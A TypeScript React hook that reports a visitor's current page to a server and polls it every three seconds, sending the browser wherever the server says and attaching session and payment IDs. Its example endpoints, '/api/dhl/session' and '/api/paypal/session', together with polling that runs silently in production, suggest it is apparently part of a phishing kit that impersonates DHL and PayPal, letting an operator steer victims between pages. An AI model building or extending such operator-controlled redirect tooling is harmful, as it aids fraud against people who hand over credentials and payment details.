import { useEffect, useRef } from "react";

interface UseRedirectPollingOptions {
  sessionId: string | null;
  currentPath: string;
  paymentId?: string;
  apiEndpoint: string; // e.g., "/api/dhl/session" or "/api/paypal/session"
  pathEndpoint: string; // e.g., "/api/dhl/session/:sessionId/path"
}

export function useRedirectPolling({
  sessionId,
  currentPath,
  paymentId,
  apiEndpoint,
  pathEndpoint,
}: UseRedirectPollingOptions) {
  const lastRedirectVersionRef = useRef<number>(0);

  useEffect(() => {
    if (!sessionId) return;

    // Report current path to server
    const reportPath = async () => {
      try {
        await fetch(pathEndpoint.replace(":sessionId", sessionId), {
          method: "PATCH",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ currentPath }),
        });
      } catch (error) {
        console.error("Failed to report path:", error);
      }
    };

    reportPath();

    // Load last seen redirect version from localStorage
    const storedVersion = localStorage.getItem(
      `redirect_version_${sessionId}`
    );
    if (storedVersion) {
      lastRedirectVersionRef.current = parseInt(storedVersion, 10);
    }

    // Poll for redirect version changes (silently in production)
    const pollInterval = setInterval(async () => {
      try {
        const response = await fetch(`${apiEndpoint}/${sessionId}`);
        if (response.ok) {
          const data = await response.json();

          // Only log in development mode
          if (import.meta.env.DEV) {
            console.log('[Redirect Polling]', {
              currentPage: currentPath,
              serverVersion: data.redirectVersion,
              localVersion: lastRedirectVersionRef.current,
              redirectUrl: data.redirectUrl,
              willRedirect: data.redirectUrl && data.redirectVersion > lastRedirectVersionRef.current && data.redirectUrl !== currentPath
            });
          }

          // Check if redirectVersion has increased (new redirect)
          // AND that we're not redirecting to the same page we're already on
          if (
            data.redirectUrl &&
            data.redirectVersion > lastRedirectVersionRef.current &&
            data.redirectUrl !== currentPath
          ) {
            if (import.meta.env.DEV) {
              console.log('[Redirect] Navigating to:', data.redirectUrl);
            }
            
            // Update last seen version in localStorage and ref
            lastRedirectVersionRef.current = data.redirectVersion;
            localStorage.setItem(
              `redirect_version_${sessionId}`,
              data.redirectVersion.toString()
            );

            // Navigate to new redirect URL
            const url = data.redirectUrl.includes("?")
              ? `${data.redirectUrl}&${paymentId ? `paymentId=${paymentId}&` : ""}session=${sessionId}`
              : `${data.redirectUrl}?${paymentId ? `paymentId=${paymentId}&` : ""}session=${sessionId}`;
            window.location.href = url;
          } else if (
            data.redirectUrl &&
            data.redirectVersion > lastRedirectVersionRef.current &&
            data.redirectUrl === currentPath
          ) {
            // Update version without redirecting if we're already on the target page
            if (import.meta.env.DEV) {
              console.log('[Redirect] Already on target page, updating version only');
            }
            lastRedirectVersionRef.current = data.redirectVersion;
            localStorage.setItem(
              `redirect_version_${sessionId}`,
              data.redirectVersion.toString()
            );
          }
        }
      } catch (error) {
        if (import.meta.env.DEV) {
          console.error("Failed to poll session:", error);
        }
      }
    }, 3000);

    return () => clearInterval(pollInterval);
  }, [sessionId, currentPath, paymentId, apiEndpoint, pathEndpoint]);
}
